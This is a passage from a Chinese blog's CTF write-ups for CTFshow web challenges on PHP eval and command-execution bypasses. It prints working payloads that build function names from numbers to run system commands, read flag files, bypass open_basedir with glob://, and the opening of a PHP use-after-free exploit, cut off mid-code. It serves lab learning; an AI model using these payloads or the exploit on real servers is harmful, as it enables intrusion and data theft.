class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: 收集自网络</span></span><br><span class="line"><span class="comment"># @Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-10-06 14:04:45</span></span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    //例子 c=<span class="number">20</span><span class="literal">-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span></span><br><span class="line"><span class="string">    foreach (<span class="variable">$blacklist</span> as <span class="variable">$blackitem</span>) &#123;</span></span><br><span class="line"><span class="string">        if (preg_match(&#x27;/&#x27; . <span class="variable">$blackitem</span> . &#x27;/m&#x27;, <span class="variable">$content</span>)) &#123;</span></span><br><span class="line"><span class="string">            die(&quot;</span>请不要输入奇奇怪怪的字符<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line"><span class="string">    <span class="variable">$whitelist</span> = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span></span><br><span class="line"><span class="string">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span></span><br><span class="line"><span class="string">    foreach (<span class="variable">$used_funcs</span>[0] as <span class="variable">$func</span>) &#123;</span></span><br><span class="line"><span class="string">        if (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span></span><br><span class="line"><span class="string">            die(&quot;</span>请不要输入奇奇怪怪的函数<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    //帮你算出答案</span></span><br><span class="line"><span class="string">    eval(&#x27;echo &#x27;.<span class="variable">$content</span>.&#x27;;&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>不能有特殊字符，不能有除whitelist里面的字母，大概思路就是利用进制转换以数字构造字母<br>题中可用的进制转换函数：<code>&#39;base_convert&#39;, &#39;bindec&#39;,&#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="type">abs</span>](<span class="variable">$_GET</span>[<span class="type">acos</span>])//strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>，有长度限制，所以利用get命令执行</span><br><span class="line">↓</span><br><span class="line"><span class="variable">$_GET</span>&#123;abs&#125;(<span class="variable">$_GET</span>&#123;acos&#125;)//[]在黑名单，用&#123;&#125;代替</span><br><span class="line">↓</span><br><span class="line"><span class="variable">$pi</span>=_GET;<span class="variable">$</span><span class="variable">$pi</span>&#123;abs&#125;(<span class="variable">$</span><span class="variable">$pi</span>&#123;acos&#125;)</span><br><span class="line">↓</span><br><span class="line">进制转换</span><br><span class="line">base_convert(number,frombase,tobase)：在任意进制之间转换数字</span><br><span class="line">dechex()：把十进制数转换为十六进制数</span><br><span class="line">hex2bin()：把十六进制值的字符串转换为二进制，返回 ASCII 字符</span><br><span class="line">最重要的是hex2bin函数，但是不在白名单里面</span><br><span class="line"></span><br><span class="line">base_convert构造hex2bin（我想用base_convert直接转_GET，但是只能得到get）</span><br><span class="line">base_convert(<span class="string">&#x27;hex2bin&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>)→<span class="number">37907361743</span></span><br><span class="line">_GET→  hex十六进制 <span class="number">5</span>f474554 (不能有字母所以十六进制不行) →  dec十进制 <span class="number">1598506324</span>(在线转换)</span><br><span class="line"></span><br><span class="line">所以_GET可以写为</span><br><span class="line">hex2bin(dechex(<span class="number">1598506324</span>))</span><br><span class="line">↓</span><br><span class="line">base_convert(<span class="string">&#x27;37907361743&#x27;</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>))</span><br><span class="line"></span><br><span class="line">最后的payload</span><br><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$</span><span class="variable">$pi</span>&#123;abs&#125;(<span class="variable">$</span><span class="variable">$pi</span>&#123;acos&#125;)&amp;abs=system&amp;acos=<span class="built_in">ls</span></span><br><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$</span><span class="variable">$pi</span>&#123;abs&#125;(<span class="variable">$</span><span class="variable">$pi</span>&#123;acos&#125;)&amp;abs=system&amp;acos=<span class="built_in">cat</span> *</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681316055871-f13664ad-be4d-43df-ba7c-d4fb99564492.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web58-77命令执行篇（三）</title>
      <link href="/2023/04/13/web58-77%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2023/04/13/web58-77%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常来说，看到这个格式，我们第一个想到的就是使用system然后命令执行，但是当我们尝试使用时会发现：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188042126-c8349447-3fd5-476b-9f44-6882c1d58843.png" alt="image.png"><br>这是因为php.ini配置中默认禁用了执行系统外部命令函数，但是这里我们可以用php内置函数来读取文件，因此这部分学习的时php相关函数的使用。<br>我们需要先查看当前目录。<code>c=print_r(glob(&quot;*&quot;));</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188390551-ccd0bc7e-f319-48f4-9048-e9709fe4a367.png" alt="image.png"><br>或者<code>c=print_r(scandir(&#39;.&#39;));</code>（注意两者的返回数组内容不同）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188668314-11508ec5-a9c6-4805-a743-2b89641beb78.png" alt="image.png"><br>我们直接显示代码就行。<br>post传参，<code>c=highlight_file(&#39;flag.php&#39;);</code>或者<code>show_source(__FILE__);</code></p><h1 id="web59-65"><a href="#web59-65" class="headerlink" title="web59-65"></a>web59-65</h1><p>题可能出错了，和58一模一样…</p><h1 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show_source被禁用，highlight_file查看flag.php文件提示不在这里。<br>那么查看根目录文件发现flag.txt。<code>c=var_dump(scandir(&#39;/&#39;));</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680189387199-0ce00bd0-0d23-44e5-a511-2f3e9b96f24b.png" alt="image.png"><br>直接用highlight_file读文件。<code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h1 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h1><p>禁用了print_r<br><code>var_dump(scandir(&#39;/&#39;));</code><br><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h1 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h1><p>把highlight_file禁用了。但是其他的还可以用。<br><code>var_dump(scandir(&#39;/&#39;));</code>查看根目录文件。<br>我们还可以使用include、require函数来阅读文件：<code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h1><p>var_dump被禁用，但是google了一下类似函数，发现了<code>var_export</code>函数功能类似。<br><code>c=var_export(scandir(&#39;/&#39;));</code><br>读取根目录下文件。<code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h1><p><code>c=var_export(scandir(&#39;/&#39;));</code><br><code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><p>尝试读取根目录：<code>c=var_export(scandir(&#39;/&#39;));</code>但是发现出现如下情况：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680191189835-ec426ee9-4d83-4d74-b321-79bbe39b0de7.png" alt="image.png"><br>经过查询发现，这是php对缓冲区进行操作导致的。</p><blockquote><p><a href="https://blog.csdn.net/weixin_39938855/article/details/115944594">https://blog.csdn.net/weixin_39938855/article/details/115944594</a></p></blockquote><p>查看index.php后发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原理就是ob_get_contents()和ob_end_clean();的执行，我们想办法让他后面的部分不执行即可，那么我们对payload后面加上<code>exit(0)</code>截断即可（或者die函数）<br><code>c=var_export(scandir(&#39;/&#39;));die(1);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680191595296-540d251d-7abb-47f6-9f07-1ea8ef6685b7.png" alt="image.png"><br>这样文本就正常了。<br><code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web72"><a href="#web72" class="headerlink" title="*web72"></a>*web72</h1><p>scandir函数被禁止了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>让我们看看wp是怎么解的吧。（水平一下又拔起来了。。。）<br>利用php脚本读取文件目录：（利用glob://伪协议绕过open_basedir）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>这是访问根目录，如果想要访问网站目录为（相对路径）：</strong><code>**&quot;glob://./*&quot;**</code><br>因为scandir这些简单函数被禁用了，就需要我们手写函数来输出。<br>发现目录下有flag0.txt，那么直接尝试require来读取。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271902026-3d23f6a9-a78f-4a2f-a7c2-7e5ed8084dc7.png" alt="image.png"><br>但是发现这些读取函数被禁用了，没有读取权限。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271990810-7fa1a783-940b-48f6-8ef4-f07133f5c45e.png" alt="image.png"><br>uaf绕过open_basedir执行命令<br>poc（需要url编码）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span 